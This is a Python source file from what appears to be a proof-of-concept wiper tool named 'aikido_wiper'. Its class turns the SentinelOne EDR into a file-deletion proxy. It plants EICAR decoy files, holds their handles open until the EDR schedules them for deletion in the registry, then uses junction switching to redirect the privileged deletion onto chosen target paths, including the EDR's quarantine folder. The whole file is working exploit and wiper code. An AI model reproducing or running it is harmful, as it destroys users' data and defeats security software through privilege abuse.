import win32file
import time
import winreg

from aikido_wiper.indirect_ops.delete.junction_switch_proxy import JunctionSwitchDeleteProxy, DecoyPath

class SentinelOneDeleteProxy(JunctionSwitchDeleteProxy):
    """
    A deletion proxy that uses Sentinel One's EDR in order to delete files or directories.
    """

    QUARANTINE_DIR = r"C:\ProgramData\Sentinel\Quarantine"

    def __init__(self, decoy_dir_path: str) -> None:
        """
        Read parent class doc.
        Also, uses one junction dir for all decoys.
        """
        super().__init__(use_one_junction_dir=True, decoy_dir_path=decoy_dir_path)
        self.__target_paths_to_open_handles = {}
        self.__wait_for_edr_happened = False

    def indirect_delete_paths(self, paths_to_delete: list[str]) -> set[str]:
        paths_to_delete.append(self.QUARANTINE_DIR)
        return super().indirect_delete_paths(paths_to_delete)

    def _create_decoy_file(self, decoy_path: DecoyPath) -> None:
        """
        Read parent class doc.
        Also, after creating the decoy file, closes and opens the file again so the EDR will detect it. The handle
        to it is left open and stored so it can be closed later.
        """
        eicar_file_handle = win32file.CreateFile(decoy_path.decoy_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.CREATE_NEW, 0, 0)
        win32file.WriteFile(eicar_file_handle, self._get_decoded_eicar(), None)
        win32file.CloseHandle(eicar_file_handle)
        eicar_file_handle = win32file.CreateFile(decoy_path.decoy_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.OPEN_EXISTING, 0, 0)

        self.__target_paths_to_open_handles[decoy_path.path_to_delete] = eicar_file_handle

    def _before_junction_switch(self, decoy_path: DecoyPath) -> None:
        """
        Read parent doc.
        Also, waits for the EDR to detect all the files only if it's the first time the callback was called for a set
        of paths to delete. The EDR should try to delete them and give up. After the EDR gave up, The function
        closes the handle to the decoy file which was left open.
        """
        key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager")
        while True:
            pending_rename_list = winreg.QueryValueEx(key, "PendingFileRenameOperations")[0]
            if f"\??\{decoy_path.decoy_file_path}" in pending_rename_list:
                break
            else:
                print(f"{decoy_path.decoy_file_path} was not marked for deletion yet, waiting")
                time.sleep(1)
        winreg.CloseKey(key)

        win32file.CloseHandle(self.__target_paths_to_open_handles[decoy_path.path_to_delete])
        self.__target_paths_to_open_handles.pop(decoy_path.path_to_delete)

    def _after_junction_switch(self, decoy_path: DecoyPath) -> None:
        self.__wait_for_edr_happened = False
